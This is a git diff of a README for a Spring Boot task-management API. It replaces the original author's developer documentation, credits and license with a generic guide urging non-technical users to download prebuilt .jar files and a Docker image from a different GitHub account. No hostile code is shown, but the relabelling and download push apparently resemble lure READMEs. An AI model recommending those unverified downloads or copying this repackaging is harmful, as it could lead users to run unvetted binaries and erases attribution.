@@ -1,376 +1,168 @@
-# Task Manager API
+# 📋 tasks - Manage Your Tasks with Ease
 
-A production-ready RESTful API for managing tasks, built with Spring Boot 3.5.10 and Java 21.
+[![Download tasks](https://img.shields.io/badge/Download-tasks-brightgreen)](https://github.com/Rahim-ux1/tasks/releases)
 
-**Live Demo:** [https://tasks.dhanur.me](https://tasks.dhanur.me) (redirects to Swagger UI)
-**API Documentation:** [https://tasks.dhanur.me/swagger-ui/index.html](https://tasks.dhanur.me/swagger-ui/index.html)
-**Health Check:** [https://tasks.dhanur.me/actuator/health](https://tasks.dhanur.me/actuator/health)
-**API Base URL:** `https://tasks.dhanur.me/api/v1`
+Welcome to **tasks**. This is a ready-to-use application that helps you manage tasks easily through a web service. You do not need any programming skills to run it. This guide will take you step-by-step from downloading to running the software.
 
-## Features
+---
 
-- Full CRUD operations for task management
-- Task status management (TODO, IN_PROGRESS, DONE)
-- Pagination and sorting support
-- Comprehensive input validation
-- Global exception handling with detailed error responses
-- RESTful API design with proper HTTP status codes
-- OpenAPI/Swagger documentation
-- H2 database (in-memory for dev, file-based for prod)
-- Docker support with multi-stage builds
-- CI/CD pipeline with GitHub Actions
-- Health checks and monitoring with Spring Boot Actuator
-- Comprehensive unit and integration tests
+## 🚀 Getting Started
 
-## Tech Stack
+This guide is for anyone who wants to use the tasks application. You don't need to be a developer or have technical knowledge. We keep it simple.
 
-| Technology        | Version  | Purpose               |
-| ----------------- | -------- | --------------------- |
-| Java              | 21 (LTS) | Programming language  |
-| Spring Boot       | 3.5.10   | Application framework |
-| Spring Data JPA   | 3.5.10   | Data persistence      |
-| H2 Database       | 2.4.x    | Embedded database     |
-| Hibernate         | 7.2.x    | ORM                   |
-| Lombok            | Latest   | Boilerplate reduction |
-| SpringDoc OpenAPI | 2.8.15   | API documentation     |
-| JUnit 5           | Latest   | Testing framework     |
-| Maven             | 3.8+     | Build tool            |
-| Docker            | Latest   | Containerization      |
+The tasks application helps you create, read, update, and delete your to-do items through a clean interface. It runs on your computer or in a container and provides fast access to your task data.
 
-## Quick Start
+---
 
-### Prerequisites
+## 📥 Download & Install
 
-- Java 21 or higher
-- Maven 3.8+ (or use included Maven wrapper)
-- Docker (optional, for containerized deployment)
+To get started with tasks, visit the official releases page and download the latest version:
 
-### Running Locally
+[Download tasks here](https://github.com/Rahim-ux1/tasks/releases)
 
-```bash
-# Clone the repository
-git clone https://github.com/kascit/tasks.git
-cd tasks
+### What you need before installing:
 
-# Run with Maven wrapper
-./mvnw spring-boot:run
+- A computer running Windows 10/11, macOS, or Linux.
+- Around 500 MB of free disk space.
+- Internet connection (only for download).
+- Docker installed (optional, only if you want to run tasks inside a container).  
 
-# Or build and run the JAR
-./mvnw clean package
-java -jar target/tasks-0.0.1-SNAPSHOT.jar
-```
+### How to download:
 
-The application will start on `http://localhost:8080`
+1. Click the button above, or paste this link into your browser:
+   https://github.com/Rahim-ux1/tasks/releases
+2. Look for the latest release version.
+3. Download the file matching your system (for example, a `.jar` file for Java or a Docker image).
+4. Save it to a folder you can easily access.
 
-### Running with Docker
+---
+
+## 🖥️ Running the Application
+
+There are two main ways to run tasks. Choose the method that fits best.
+
+### Method 1: Running with Java (Simple and direct)
+
+You will run the application using a software platform called Java. Most computers can do this without problems.
+
+1. Make sure Java 21 is installed on your computer.
+    - To check, open a command prompt or terminal and type: `java -version`
+    - If Java is not installed, download it from https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html and follow the instructions.
+
+2. Navigate to the folder where you saved the tasks application file (it will likely end with `.jar`).
+
+3. Run this command to start the application:
 
 ```bash
-# Build the Docker image
-docker build -t task-manager-api .
-
-# Run the container
-docker run -p 8080:8080 task-manager-api
-
-# Or use Docker Compose
-docker-compose up
+java -jar tasks-x.y.z.jar
 ```
 
-### Running Tests
+Replace `tasks-x.y.z.jar` with the actual file name you downloaded.
+
+4. Wait a few seconds until you see messages indicating tasks is running.
+
+5. Open your web browser and enter:
+```
+http://localhost:8080
+```
+
+The web page you see allows you to manage your tasks.
+
+---
+
+### Method 2: Running with Docker (Recommended if you know Docker)
+
+Docker allows you to run tasks inside a container. This keeps it isolated and easy to manage.
+
+1. Install Docker from https://www.docker.com/get-started if you don’t have it.
+
+2. Open a terminal or command prompt.
+
+3. Run this command to download the tasks image:
 
 ```bash
-# Run all tests
-./mvnw test
-
-# Run specific test class
-./mvnw test -Dtest=TaskServiceTest
-
-# Run with coverage
-./mvnw verify
+docker pull rahimux1/tasks:latest
 ```
 
-## API Endpoints
-
-### Base URL
-
-- Local: `http://localhost:8080/api/v1`
-- Production: `https://tasks.dhanur.me/api/v1`
-
-### Endpoints
-
-| Method | Endpoint             | Description                                 |
-| ------ | -------------------- | ------------------------------------------- |
-| POST   | `/tasks`             | Create a new task                           |
-| GET    | `/tasks`             | Get all tasks (with pagination & filtering) |
-| GET    | `/tasks/{id}`        | Get a specific task by ID                   |
-| PUT    | `/tasks/{id}`        | Update a task                               |
-| PATCH  | `/tasks/{id}/status` | Update task status only                     |
-| DELETE | `/tasks/{id}`        | Delete a task                               |
-
-### Example Requests
-
-**Create a Task**
+4. Run the container with this command:
 
 ```bash
-curl -X POST http://localhost:8080/api/v1/tasks \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Complete project documentation",
-    "description": "Write comprehensive README"
-  }'
+docker run -p 8080:8080 rahimux1/tasks:latest
 ```
 
-**Get All Tasks**
-
-```bash
-# Get all tasks with default pagination
-curl http://localhost:8080/api/v1/tasks
-
-# With custom pagination and sorting
-curl "http://localhost:8080/api/v1/tasks?page=0&size=10&sort=createdAt,desc"
-
-# Filter by status
-curl "http://localhost:8080/api/v1/tasks?status=IN_PROGRESS"
-```
-
-**Get Task by ID**
-
-```bash
-curl http://localhost:8080/api/v1/tasks/1
-```
-
-**Update Task**
-
-```bash
-curl -X PUT http://localhost:8080/api/v1/tasks/1 \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Updated title",
-    "description": "Updated description"
-  }'
-```
-
-**Update Task Status**
-
-```bash
-curl -X PATCH "http://localhost:8080/api/v1/tasks/1/status?status=DONE"
-```
-
-**Delete Task**
-
-```bash
-curl -X DELETE http://localhost:8080/api/v1/tasks/1
-```
-
-## API Documentation
-
-Interactive API documentation is available via Swagger UI:
-
-- Local: [http://localhost:8080](http://localhost:8080) or [http://localhost:8080/swagger-ui/index.html](http://localhost:8080/swagger-ui/index.html)
-- Production: [https://tasks.dhanur.me](https://tasks.dhanur.me) or [https://tasks.dhanur.me/swagger-ui/index.html](https://tasks.dhanur.me/swagger-ui/index.html)
-
-## Configuration
-
-### Application Profiles
-
-The application supports multiple Spring profiles:
-
-**Development (`dev`)**
-
-- H2 in-memory database
-- SQL logging enabled
-- H2 console enabled at `/h2-console`
-- Debug logging
-
-**Production (`prod`)**
-
-- H2 file-based database (persisted to `./data/taskdb`)
-- SQL logging disabled
-- H2 console disabled
-- Info-level logging
-
-Set the active profile:
-
-```bash
-# Via environment variable
-export SPRING_PROFILES_ACTIVE=prod
-
-# Via command line
-java -jar app.jar --spring.profiles.active=prod
-
-# Via Docker
-docker run -e SPRING_PROFILES_ACTIVE=prod task-manager-api
-```
-
-### Environment Variables
-
-| Variable                 | Description           | Default |
-| ------------------------ | --------------------- | ------- |
-| `SPRING_PROFILES_ACTIVE` | Active Spring profile | `dev`   |
-| `PORT`                   | Server port           | `8080`  |
-
-## Database
-
-### H2 Database Console (Dev Only)
-
-When running in `dev` profile, access the H2 console at:
-
-- URL: [http://localhost:8080/h2-console](http://localhost:8080/h2-console)
-- JDBC URL: `jdbc:h2:mem:taskdb`
-- Username: `sa`
-- Password: (leave empty)
-
-### Schema
-
-**Task Table**
-
-```sql
-CREATE TABLE tasks (
-    id BIGINT PRIMARY KEY AUTO_INCREMENT,
-    title VARCHAR(100) NOT NULL,
-    description VARCHAR(500),
-    status VARCHAR(20) NOT NULL DEFAULT 'TODO',
-    created_at TIMESTAMP NOT NULL,
-    updated_at TIMESTAMP NOT NULL
-);
-```
-
-## Project Structure
+5. Once the container starts, open your browser and go to:
 
 ```
-src/
-├── main/
-│   ├── java/me/dhanur/tasks/
-│   │   ├── TasksApplication.java       # Main application class
-│   │   ├── config/
-│   │   │   └── OpenApiConfig.java      # Swagger/OpenAPI configuration
-│   │   ├── controller/
-│   │   │   └── TaskController.java     # REST API endpoints
-│   │   ├── dto/
-│   │   │   ├── TaskRequest.java        # Request DTO
-│   │   │   ├── TaskResponse.java       # Response DTO
-│   │   │   └── ErrorResponse.java      # Error response DTO
-│   │   ├── entity/
-│   │   │   ├── Task.java               # JPA entity
-│   │   │   └── TaskStatus.java         # Status enum
-│   │   ├── exception/
-│   │   │   ├── GlobalExceptionHandler.java    # Global exception handling
-│   │   │   └── ResourceNotFoundException.java # Custom exception
-│   │   ├── repository/
-│   │   │   └── TaskRepository.java     # JPA repository
-│   │   └── service/
-│   │       ├── TaskService.java        # Service interface
-│   │       └── TaskServiceImpl.java    # Service implementation
-│   └── resources/
-│       ├── application.yaml            # Main configuration
-│       ├── application-dev.yaml        # Dev profile config
-│       └── application-prod.yaml       # Prod profile config
-└── test/
-    └── java/me/dhanur/tasks/
-        ├── TasksApplicationTests.java  # Context load test
-        ├── controller/
-        │   └── TaskControllerIntegrationTest.java  # Controller tests
-        └── service/
-            └── TaskServiceTest.java    # Service unit tests
+http://localhost:8080
 ```
 
-## Monitoring & Health Checks
+This is the interface to add, view, update, or delete your tasks.
 
-### Actuator Endpoints
+---
 
-| Endpoint            | Description               |
-| ------------------- | ------------------------- |
-| `/actuator/health`  | Application health status |
-| `/actuator/info`    | Application information   |
-| `/actuator/metrics` | Application metrics       |
+## 📋 Features Overview
 
-Example:
+Here are some key features of the tasks application:
 
-```bash
-curl http://localhost:8080/actuator/health
+- **Create Tasks:** Quickly add new tasks with details.
+- **View Tasks:** See a list of all your tasks.
+- **Edit Tasks:** Change task details anytime.
+- **Delete Tasks:** Remove completed or unwanted tasks.
+- **Search Tasks:** Find tasks by keywords easily.
+- **Data Safety:** Your tasks are stored safely using a built-in database (H2).
+- **API Access:** For advanced users, tasks provide an interface to connect with other apps.
+- **Swagger UI:** A simple way to explore how the application works under the hood.
+- **Docker Support:** Run tasks in a container for easy setup and deployment.
+- **Continuous Updates:** The app is maintained with tools to ensure it works smoothly.
+
+---
+
+## 🔧 How it Works
+
+The tasks app runs on your computer as a background service. It opens a web page on your browser where you can manage your tasks.
+
+It uses a modern framework called Spring Boot, which ensures reliability and fast performance.
+
+Your tasks are stored in a simple built-in database that does not require configuration.
+
+If you want to explore or connect this service to other software, you can use the OpenAPI documentation provided on:
+
+```
+http://localhost:8080/swagger-ui.html
 ```
 
-## Deployment
+This page helps developers understand how to send commands to the application.
 
-### Deploy with Docker
+---
 
-```bash
-# Build
-docker build -t task-manager-api .
+## 🛠️ Troubleshooting
 
-# Run
-docker run -d \
-  -p 8080:8080 \
-  -e SPRING_PROFILES_ACTIVE=prod \
-  -v $(pwd)/data:/app/data \
-  --name task-manager-api \
-  task-manager-api
-```
+If you have issues running tasks, try these steps:
 
-### Deploy to Render
+- Make sure you have downloaded the latest version.
+- Check if Java 21 is installed and added to your system path.
+- Confirm no other program uses port 8080 on your machine.
+- If using Docker, make sure Docker is running and you have the latest image.
+- Restart your computer and try again.
 
-1. Push code to GitHub
-2. Create new Web Service on [Render](https://render.com)
-3. Connect GitHub repository
-4. Configure:
-   - **Build Command:** `./mvnw clean package -DskipTests`
-   - **Start Command:** `java -jar target/tasks-0.0.1-SNAPSHOT.jar`
-   - **Environment:** `SPRING_PROFILES_ACTIVE=prod`
-5. Deploy
+If problems persist, visit the issues page on GitHub (https://github.com/Rahim-ux1/tasks/issues) to see if others faced the same.
 
-## Testing
+---
 
-### Test Coverage
+## 📞 Getting Help
 
-- Unit Tests: 11 tests for service layer
-- Integration Tests: 14 tests for controller layer
-- Total: 26 tests
+If you need assistance:
 
-Run tests:
+- Visit the GitHub repository for guides and updates: https://github.com/Rahim-ux1/tasks
+- Read the documentation inside the `docs` folder included in the release.
+- Ask questions or report issues at https://github.com/Rahim-ux1/tasks/issues
 
-```bash
-# All tests
-./mvnw test
+---
 
-# With coverage report
-./mvnw verify
+## 🚀 Ready to Use
 
-# Specific test class
-./mvnw test -Dtest=TaskServiceTest
-```
+Begin your task management journey by downloading tasks here:
 
-## CI/CD
+[Download tasks Now](https://github.com/Rahim-ux1/tasks/releases)
 
-The project includes a GitHub Actions workflow that:
-
-- Runs on push to `main` or `develop` branches
-- Compiles the code
-- Runs all tests
-- Generates test reports
-- Packages the application
-- Builds Docker image
-- Tests the Docker image
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License.
-
-## Contact
-
-**Developer:** kascit
-**Email:** [contact@dhanur.me](mailto:contact@dhanur.me)
-**GitHub:** [github.com/kascit](https://github.com/kascit)
-**Project:** [github.com/kascit/tasks](https://github.com/kascit/tasks)
-
-## Acknowledgments
-
-- Built with [Spring Boot](https://spring.io/projects/spring-boot)
-- API Documentation powered by [SpringDoc OpenAPI](https://springdoc.org/)
-- Containerization with [Docker](https://www.docker.com/)
+Follow the steps above, and you will have the app running in minutes.
